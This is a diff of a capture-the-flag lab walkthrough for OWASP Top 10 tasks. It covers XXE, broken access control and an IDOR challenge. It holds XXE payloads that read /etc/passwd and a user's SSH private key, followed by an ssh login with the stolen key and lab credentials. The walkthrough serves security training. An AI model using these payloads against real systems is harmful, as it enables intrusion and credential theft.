@@ -197,31 +197,30 @@ MAC Address: 02:92:AB:C9:74:07 (Unknown)
 
 Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}
 
-Use `firefox` to load url `http://<ip>` and try the below payloads.
-
+Use `firefox` to load url `http://<ip>` and try the below payloads. Use `&` in place of `&amp;`.
 {% capture code %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
   <userInfo>
     <firstName>falcon</firstName>
-    <lastName>&#038;name;</lastName>
+    <lastName>&amp;name;</lastName>
   </userInfo>{% endcapture %} {% include code.html code=code%}
 
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+<root>&amp;read;</root>{% endcapture %} {% include code.html code=code %}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
 
 ## Task 16 - [Severity 4] XML External Entity - Exploiting
 
-Use `firefox` to load the url `http://<ip>`
+Use `firefox` to load the url `http://<ip>`.
 
-Use the following payloads to get the contents of `/etc/passwd`.
+Use the following payloads to get the contents of `/etc/passwd`. Use `&` in place of `&amp;`.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&#038;read;</root>{% endcapture %} {% include code.html code=code%}
+<root>&amp;read;</root>{% endcapture %} {% include code.html code=code %}
 
-There is one non-system user. Use the following payload to read the user's rsa private key.
+There is one non-system user. Use the following payload to read the user's rsa private key. Use `&` in place of `&amp;`.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&#038;read;</root>{% endcapture %} {% include code.html code=code%}
+<root>&amp;read;</root>{% endcapture %} {% include code.html code=code %}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
@@ -232,5 +231,27 @@ Copy the contents of payload output to new file. Change the permission of the fi
 Use these links as references.
 - [OWASP Access Control Severity](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control){:target="_blank"}
 
+Broken Access Control is a scenario when regular user can access protected pages.
+
+`Scenario 1` The application uses unverified data in a SQL call that is accessing account information.
+{% capture code %}pstmt.setString(1, request.getParameter("acct"));
+ResultSet results = pstmt.executeQuery( );{% endcapture %} {% include code.html code=code %}
+In above scenario, the parameter "acct" is not verified properly and can be accessed using `http://example.com/app/accountInfo?acct=notmyacct`.
+
+`Scenario 2` An attacker force browses to target URLs. Admin rights are required for access to the admin page, similar to `http://example.com/app/getappInfo` or `http://example.com/app/admin_getappInfo`.
+
+
+## Task 18 - [Severity 5] Broken Access Control (IDOR Challenge)
+
+Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources.
+
+Use `firefox` to load the url `http://<ip>` using username `noot` and password `test1234`. The url will be redirected to a php page with where clause, similar to `http://<ip>/note.php?note=1`. Manipulae the `id` to retrieve the flag.
+
+
+* Task 19 - [Severity 6] Security Misconfiguration
+
+Use these links as references.
+- [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/){:target="_blank"}
+- [OWASP Security Misconfiguration Severity](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration){:target="_blank"}
 
 
